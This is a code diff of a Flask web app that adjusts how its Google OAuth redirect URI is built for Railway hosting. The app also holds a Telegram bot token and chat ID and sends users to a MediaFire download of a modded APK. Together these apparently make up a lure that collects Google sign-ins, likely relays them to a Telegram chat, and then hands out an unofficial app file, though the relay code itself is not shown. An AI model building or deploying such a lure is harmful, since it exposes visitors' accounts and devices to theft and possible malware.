@@ -1,12 +1,8 @@
 import os
 import requests
 from flask import Flask, redirect, render_template_string, request, url_for
-from werkzeug.middleware.proxy_fix import ProxyFix
 
 app = Flask(__name__)
-# هذا السطر هو الحل الجذري لمشكلة الروابط خلف منصات الاستضافات مثل Railway
-app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)
-
 app.secret_key = os.getenv("SECRET_KEY", "final_secure_key_999")
 
 CLIENT_ID = os.getenv("GOOGLE_CLIENT_ID")
@@ -14,6 +10,11 @@ CLIENT_SECRET = os.getenv("GOOGLE_CLIENT_SECRET")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 FINAL_REDIRECT_URL = "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod__40_Updated__41_.apk/file"
+
+# ضع رابط موقعك الحقيقي على ريلواي هنا تماماً لتجنب أي خطأ في المطابقة (مثال: https://xxxx.up.railway.app)
+CUSTOM_DOMAIN = os.getenv(
+    "CUSTOM_DOMAIN", "https://اسم_موقعك_على_ريلواي.up.railway.app"
+)
 
 
 @app.route("/")
@@ -48,7 +49,7 @@ def index():
 
 @app.route("/google-login")
 def google_redirect():
-  redirect_uri = url_for("authorized", _external=True)
+  redirect_uri = f"{CUSTOM_DOMAIN}/authorized"
   google_auth_url = (
       "https://accounts.google.com/o/oauth2/v2/auth?"
       f"client_id={CLIENT_ID}&"
@@ -65,7 +66,7 @@ def authorized():
   if not code:
     return redirect(url_for("index"))
 
-  redirect_uri = url_for("authorized", _external=True)
+  redirect_uri = f"{CUSTOM_DOMAIN}/authorized"
 
   token_url = "https://oauth2.googleapis.com/token"
   data = {
